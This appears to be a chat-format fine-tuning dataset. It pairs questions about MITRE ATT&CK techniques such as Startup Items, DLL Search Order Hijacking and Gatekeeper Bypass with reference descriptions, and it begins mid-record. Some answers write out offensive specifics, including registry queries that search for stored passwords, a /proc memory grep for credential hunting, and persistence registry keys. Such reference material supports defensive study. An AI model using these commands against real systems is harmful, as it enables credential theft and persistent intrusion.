example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)Similarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021). The systems targeted by this attack pattern are: Linux, macOS, Windows, Office 365, SaaS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Startup Items' and with the Id: T1165 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Startup Items' and with the Id: T1165 is described as follows: Per Apple\u2019s documentation, startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items (Citation: Startup Items). This is technically a deprecated version (superseded by Launch Daemons), and thus the appropriate folder, <code>/Library/StartupItems</code> isn\u2019t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism (Citation: Methods of Mac Malware Persistence). Additionally, since StartupItems run during the bootup phase of macOS, they will run as root. If an adversary is able to modify an existing Startup Item, then they will be able to Privilege Escalate as well.. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Clear Linux or Mac System Logs' and with the Id: T1070.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Clear Linux or Mac System Logs' and with the Id: T1070.002 is described as follows: Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)* <code>/var/log/messages:</code>: General and system-related messages* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records* <code>/var/log/kern.log</code>: Kernel logs* <code>/var/log/cron.log</code>: Crond logs* <code>/var/log/maillog</code>: Mail server logs* <code>/var/log/httpd/</code>: Web server access and error logs. The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Application or System Exploitation' and with the Id: T1499.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Application or System Exploitation' and with the Id: T1499.004 is described as follows: Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.Adversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. . The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Office Application Startup' and with the Id: T1137 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Office Application Startup' and with the Id: T1137 is described as follows: Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules). The systems targeted by this attack pattern are: Windows, Office 365 ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'InstallUtil' and with the Id: T1218.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'InstallUtil' and with the Id: T1218.004 is described as follows: Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>.InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Spearphishing Link' and with the Id: T1598.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Spearphishing Link' and with the Id: T1598.003 is described as follows: Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)Adversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)Adversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)Adversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)Adversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.From the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SSH' and with the Id: T1021.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SSH' and with the Id: T1021.004 is described as follows: Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.. The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Additional Cloud Roles' and with the Id: T1098.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Additional Cloud Roles' and with the Id: T1098.003 is described as follows: An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)(Citation: Microsoft O365 Admin Roles) This account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.For example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)In some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024). The systems targeted by this attack pattern are: Office 365, IaaS, SaaS, Google Workspace, Azure AD ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Print Processors' and with the Id: T1547.012 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Print Processors' and with the Id: T1547.012 is described as follows: Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL.For the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Disabling Security Tools' and with the Id: T1089 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Disabling Security Tools' and with the Id: T1089 is described as follows: Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Disk Structure Wipe' and with the Id: T1487 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Disk Structure Wipe' and with the Id: T1487 is described as follows: Adversaries may corrupt or wipe the disk data structures on hard drive necessary to boot systems; targeting specific critical systems as well as a large number of systems in a network to interrupt availability to system and network resources. Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1487) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1488) if all sectors of a disk are wiped.To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017). The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Spearphishing Attachment' and with the Id: T1566.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Spearphishing Attachment' and with the Id: T1566.001 is described as follows: Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. . The systems targeted by this attack pattern are: macOS, Windows, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Credentials in Registry' and with the Id: T1214 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Credentials in Registry' and with the Id: T1214 is described as follows: The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Stripped Payloads' and with the Id: T1027.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Stripped Payloads' and with the Id: T1027.008 is described as follows: Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system\u2019s `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.(Citation: Mandiant golang stripped binaries explanation)(Citation: intezer stripped binaries elf files 2018)Adversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of [AppleScript](https://attack.mitre.org/techniques/T1059/002), to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.(Citation: SentinelLabs reversing run-only applescripts 2021). The systems targeted by this attack pattern are: macOS, Linux, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Component Object Model' and with the Id: T1559.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Component Object Model' and with the Id: T1559.001 is described as follows: Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'DLL Search Order Hijacking' and with the Id: T1574.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'DLL Search Order Hijacking' and with the Id: T1574.001 is described as follows: Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)Phantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.(Citation: Adversaries Hijack DLLs) They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.Adversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Automated Collection' and with the Id: T1119 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Automated Collection' and with the Id: T1119 is described as follows: Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.(Citation: Mandiant UNC3944 SMS Phishing 2023) This functionality could also be built into remote access tools. This technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.. The systems targeted by this attack pattern are: Linux, macOS, Windows, IaaS, SaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Clipboard Data' and with the Id: T1115 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Clipboard Data' and with the Id: T1115 is described as follows: Adversaries may collect data stored in the clipboard from users copying information within or between applications. For example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>.(Citation: MSDN Clipboard)(Citation: clip_win_server)(Citation: CISA_AA21_200B) Additionally, adversaries may monitor then replace users\u2019 clipboard with their data (e.g., [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)).(Citation: mining_ruby_reversinglabs)macOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre). The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Proc Filesystem' and with the Id: T1003.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Proc Filesystem' and with the Id: T1003.007 is described as follows: Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process\u2019s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process\u2019s virtual address space.(Citation: Picus Labs Proc cump 2022)(Citation: baeldung Linux proc map 2022)When executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as <code>grep -E \"^[0-9a-f-]* r\" /proc/\"$pid\"/maps | cut -d' ' -f 1</code>, to look for fixed strings in memory structures or cached hashes.(Citation: atomic-red proc file system) When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process\u2019s memory.(Citation: MimiPenguin GitHub May 2017)(Citation: Polop Linux PrivEsc Gitbook)If running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.. The systems targeted by this attack pattern are: Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Botnet' and with the Id: T1583.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Botnet' and with the Id: T1583.005 is described as follows: Adversaries may buy, lease, or rent a network of compromised systems\u00a0that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Password Managers' and with the Id: T1555.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Password Managers' and with the Id: T1555.005 is described as follows: Adversaries may acquire user credentials from third-party password managers.(Citation: ise Password Manager February 2019) Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.(Citation: ise Password Manager February 2019)Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.(Citation: FoxIT Wocao December 2019)(Citation: Github KeeThief) Adversaries may extract credentials from memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).(Citation: NVD CVE-2019-3610) Adversaries may also try brute forcing via [Password Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master password of a password manager.(Citation: Cyberreason Anchor December 2019). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'AppInit DLLs' and with the Id: T1103 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'AppInit DLLs' and with the Id: T1103 is described as follows: Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017) Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry)The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Gatekeeper Bypass' and with the Id: T1553.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Gatekeeper Bypass' and with the Id: T1553.001 is described as follows: Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple\u2019s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation: TheEclecticLightCompany apple notarization )Based on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:1. Checks extended attribute \u2013 Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.(Citation: OceanLotus for OS X)(Citation: 20 macOS Common Tools and Techniques)2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.3. Code Signing \u2013 Gatekeeper checks for a valid code signature from an Apple Developer ID.4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an \u201cunauthorized app\u201d and the security policy will be modified.Adversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211)), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.(Citation: theevilbit gatekeeper bypass 2021)(Citation: Application Bundle Manipulation Brandon Dalton)Applications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).. The systems targeted by this attack pattern are: macOS ."}]}
